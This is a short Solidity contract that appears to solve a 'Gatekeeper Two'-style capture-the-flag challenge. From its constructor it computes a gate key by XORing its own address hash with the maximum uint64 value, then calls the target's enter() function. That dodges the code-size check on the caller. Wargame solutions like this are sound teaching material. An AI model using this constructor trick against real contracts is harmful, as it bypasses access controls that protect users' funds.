pragma solidity ^0.8.0;

interface IGate {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract HackGateTwo {

    constructor(address _gate) {
        bytes8 _gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        IGate(_gate).enter(_gateKey);
    }
}